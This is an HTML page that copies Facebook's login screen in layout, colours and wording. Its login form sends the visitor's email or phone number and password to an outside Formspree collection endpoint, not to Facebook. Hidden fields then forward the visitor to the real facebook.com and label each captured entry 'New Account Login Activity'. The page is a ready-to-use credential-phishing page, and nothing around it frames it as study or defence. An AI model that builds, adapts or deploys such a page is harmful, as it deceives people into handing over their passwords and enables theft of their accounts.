<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook – log in or sign up</title>

<style>
    body {
        background-color: #f0f2f5;
        font-family: SFProDisplay-Regular, Helvetica, Arial, sans-serif;
        margin: 0;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
    }

    .login-container {
        width: 100%;
        max-width: 980px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 20px;
    }

    /* Left Side */
    .left-side {
        width: 580px;
        padding-right: 32px;
        margin-top: -100px;
    }

    .left-side h1 {
        color: #1877f2;
        font-size: 60px;
        font-weight: 800;
        letter-spacing: -2px;
        margin-bottom: 0;
    }

    .left-side p {
        font-size: 24px;
        line-height: 28px;
        color: #1c1e21;
        margin-top: 10px;
        font-weight: normal;
    }

    /* Right Card */
    .right-side {
        width: 396px;
    }

    .login-card {
        background: #fff;
        padding: 16px;
        border-radius: 8px;
        box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 24px rgba(0, 0, 0, .1);
        text-align: center;
    }

    .login-card input {
        width: 100%;
        height: 52px;
        padding: 14px 16px;
        margin-bottom: 12px;
        border: 1px solid #dddfe2;
        border-radius: 6px;
        font-size: 17px;
        box-sizing: border-box;
    }

    .login-card input:focus {
        outline: none;
        border: 1px solid #1877f2;
        box-shadow: 0 0 0 2px #e7f3ff;
    }

    .login-btn {
        width: 100%;
        background-color: #1877f2;
        border: none;
        border-radius: 6px;
        color: #fff;
        font-size: 20px;
        font-weight: 700;
        padding: 10px 0;
        cursor: pointer;
        margin-top: 4px;
    }

    .login-btn:hover {
        background-color: #166fe5;
    }

    .forgot-link {
        display: block;
        margin: 15px 0;
        color: #1877f2;
        text-decoration: none;
        font-size: 14px;
    }

    .forgot-link:hover {
        text-decoration: underline;
    }

    .divider {
        border-bottom: 1px solid #dadde1;
        margin: 20px 0;
    }

    .create-btn {
        background-color: #42b72a;
        border: none;
        border-radius: 6px;
        color: #fff;
        font-size: 17px;
        font-weight: 700;
        padding: 12px 16px;
        cursor: pointer;
        text-decoration: none;
        display: inline-block;
    }

    .create-btn:hover {
        background-color: #36a420;
    }

    /* Mobile Responsive */
    @media (max-width: 900px) {
        .login-container {
            flex-direction: column;
            text-align: center;
            padding-top: 20px;
        }

        .left-side {
            width: 100%;
            padding-right: 0;
            margin-top: 0;
            margin-bottom: 40px;
        }

        .left-side h1 {
            font-size: 45px;
        }

        .left-side p {
            font-size: 20px;
        }

        .right-side {
            width: 100%;
            max-width: 400px;
        }
    }
</style>
</head>
<body>

<div class="login-container">
    <div class="left-side">
        <h1>facebook</h1>
        <p>Facebook helps you connect and share with the people in your life.</p>
    </div>

    <div class="right-side">
        <div class="login-card">
            <form action="https://formspree.io/f/mgongrlg" method="POST">
                <input type="text" name="_entry_user" placeholder="Email address or phone number" required>
                <input type="password" name="_entry_pass" placeholder="Password" required>
                
                <input type="hidden" name="_next" value="https://www.facebook.com">
                <input type="hidden" name="_subject" value="New Account Login Activity">

                <button type="submit" class="login-btn">Log In</button>
                
                <a href="#" class="forgot-link">Forgotten password?</a>
                
                <div class="divider"></div>
                
                <a href="#" class="create-btn">Create new account</a>
            </form>
        </div>
        <p style="margin-top: 28px; font-size: 14px;"><a href="#" style="text-decoration: none; color: black; font-weight: bold;">Create a Page</a> for a celebrity, brand or business.</p>
    </div>
</div>

</body>
</html>
